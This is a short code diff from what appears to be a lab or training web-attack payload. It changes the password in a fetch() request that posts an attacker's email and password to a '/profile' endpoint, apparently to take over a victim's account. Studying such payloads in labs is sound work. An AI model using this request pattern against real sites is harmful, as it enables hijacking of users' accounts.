@@ -6,6 +6,6 @@ fetch("/profile", {
     },
     body: new URLSearchParams({
         email: "attacker@devbank.local",
-        password: "Pwned-A2-2026"
+        password: "Exploit-B2"
     })
 });
